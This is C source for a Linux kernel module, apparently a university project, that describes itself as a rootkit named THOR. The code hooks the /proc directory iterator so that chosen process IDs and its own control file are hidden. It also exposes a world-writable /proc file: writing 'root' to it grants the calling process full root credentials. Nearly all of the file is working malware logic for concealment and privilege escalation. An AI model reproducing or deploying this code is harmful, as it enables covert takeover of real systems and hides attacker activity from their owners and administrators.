#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/ptrace.h>
#include <linux/slab.h>

#include "fs/proc/internal.h"

#include "logging.h"

#define THOR_PROCFILE "thor"

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })

// ------------------------------------------------------------ PROTOTYPES
static int __init thor_init(void);
static int __init procfile_init(void);
static int __init prochidder_init(void);
static int procfile_open(struct inode *inode, struct file *file);
static int procfile_read(struct seq_file *m, void *v);
static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
static void procfile_cleanup(void);
static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
// ------------------------------------------------------------ DEFINITIONS
struct _pid_list {
    char *name;
    struct list_head list;
};
// ------------------------------------------------------------ GLOBALS
static struct proc_dir_entry *procfile;
static struct proc_dir_entry *procroot;
static struct file_operations *proc_fops;
static int (*orig_proc_iterate)(struct file *, struct dir_context *);
static int (*orig_proc_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static struct file_operations procfile_fops = {
    .owner = THIS_MODULE,
    .open = procfile_open,
    .read = seq_read,
    .write = procfile_write,
    .llseek = seq_lseek,
    .release = single_release,
};
struct _pid_list pid_list;
// ------------------------------------------------------------ HELPERS
static void set_addr_rw(void *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
}

// ------------------------------------------------------------ INIT
static int __init thor_init(void)
{
    procfile_init();
    prochidder_init();

    LOG_INFO("init done");
    return 0;
}

static int __init procfile_init(void)
{
    // allocate file in proc
    procfile = proc_create(THOR_PROCFILE, 0666, NULL, &procfile_fops);
    if (procfile == NULL) {
        LOG_ERROR("could not create proc entry");
        return -1;
    }

    return 0;
}

static int __init prochidder_init(void)
{
    if (procfile == NULL) {
        LOG_ERROR("procfile not set");
        return -1;
    }

    // insert our modified iterate for /proc
    procroot = procfile->parent;
    proc_fops = procroot->proc_fops;
    orig_proc_iterate = proc_fops->iterate;

    set_addr_rw(proc_fops);
    proc_fops->iterate = thor_proc_iterate;
    set_addr_ro(proc_fops);

    INIT_LIST_HEAD(&pid_list.list);

    return 0;
}

// ------------------------------------------------------------ PROCFILE
static int procfile_read(struct seq_file *m, void *v)
{
    seq_printf(m, 
        "usage:\n"\
        "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
        "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
    return 0;
}

static int procfile_open(struct inode *inode, struct file *file)
{
    return single_open(file, procfile_read, NULL);
}

static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos)
{
    struct _pid_list *tmp;
    if(0 == strncmp(buffer, "hp", MIN(2, count)))
    {
        tmp = (struct _pid_list*)kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
        tmp->name = (char*)kmalloc(count-2, GFP_KERNEL);
        memcpy(tmp->name, buffer+2, count-2);
        tmp->name[count-3] = 0;
        LOG_DEBUG("a:%s",tmp->name);
        list_add(&(tmp->list), &(pid_list.list));
    }
    else if(0 == strncmp(buffer, "root", MIN(4, count)))
    {
        struct cred *credentials = prepare_creds();
        credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
        credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
        commit_creds(credentials);
    }
    return count;
}

// ------------------------------------------------------------ PROCROOT
static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
{
    // capture original filldir function
    orig_proc_filldir = ctx->actor;
    // cast away const from ctx->actor
    filldir_t *ctx_actor = (filldir_t*)(&ctx->actor);
    // store our filldir in ctx->actor
    *ctx_actor = thor_proc_filldir;
    return orig_proc_iterate(file, ctx);
}

static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct _pid_list *tmp;
    // hide specified PIDs
    list_for_each_entry(tmp, &(pid_list.list), list)
    {
        if(0 == strcmp(name, tmp->name)) return 0;
    }
    // hide thor itself
    if (0 == strcmp(name, THOR_PROCFILE)) return 0;
    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
}

// ------------------------------------------------------------ CLEANUP
static void __exit thor_cleanup(void)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    procfile_cleanup();

    if(NULL != proc_fops && NULL != orig_proc_iterate)
    {
        set_addr_rw(proc_fops);
        proc_fops->iterate = orig_proc_iterate;
        set_addr_ro(proc_fops);
    }

    list_for_each_safe(pos, q, &(pid_list.list))
    {
        tmp = list_entry(pos, struct _pid_list, list);
        list_del(pos);
        kfree(tmp->name);
        kfree(tmp);
    }

    LOG_INFO("cleanup done");
}

static void procfile_cleanup(void)
{
    if (procfile != NULL) {
        proc_remove(procfile);
        procfile = NULL;
    }
}

module_init(thor_init);
module_exit(thor_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Hirsch (W4RH4WK) <alexander.hirsch@student.uibk.ac.at>");
MODULE_AUTHOR("Franz-Josef Anton Friedrich Haider (krnylng) <Franz-Josef.Haider@student.uibk.ac.at>");
MODULE_DESCRIPTION("THOR - The Horrific Omnipotent Rootkit");
